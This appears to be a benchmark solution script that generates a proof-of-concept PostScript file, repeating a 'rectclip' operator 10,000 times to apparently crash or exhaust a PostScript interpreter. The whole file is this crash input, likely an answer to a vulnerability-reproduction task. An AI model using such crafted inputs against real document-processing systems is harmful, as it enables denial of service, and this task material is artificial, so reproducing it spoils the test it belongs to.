class Solution:
    def solve(self, src_path: str) -> bytes:
        clip_str = "0 0 10 10 rectclip\n"
        num_clips = 10000
        poc_str = "%!\n" + clip_str * num_clips + "showpage\n"
        return poc_str.encode('ascii')